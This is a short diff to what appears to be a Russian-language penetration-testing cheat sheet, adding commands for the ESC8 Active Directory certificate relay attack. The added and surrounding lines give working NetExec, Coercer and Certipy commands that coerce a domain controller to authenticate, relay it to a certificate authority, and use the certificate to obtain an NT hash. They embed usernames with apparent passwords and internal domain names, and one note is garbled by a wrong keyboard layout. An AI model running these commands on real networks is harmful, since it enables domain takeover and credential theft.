@@ -593,6 +593,12 @@
 
 *** ESC8 - Сертификат рилей
 
+		nxc smb DC_CONTR -u simenko -p Master -M coerce_plus -o LISTENER=свой хост ALWAYS=TRUE
+		sudo certipy-ad relay -target DNS_CA -ca CA_Name  -template Machine
+		certipy-ad auth -pfx gm10.pfx -domain kuba.prom.ru -dc-ip DC_Contrl
+
+
+
 		sudo certipy-ad relay -target dc.domain.local -ca domain-DC-CA-1  -template Machine  (DomainController - если атака на dc b jy hfpytcty c ADCS)
 		coercer coerce -l 192.168.134.24(listener_host) -t 192.168.134.12 (target) -u s.ivanov -p Venturers2004 -d domain.local -v
 		certipy auth -pfx ws01.pfx -dc-ip 172.16.117.3  (чтобы получить NT hash)
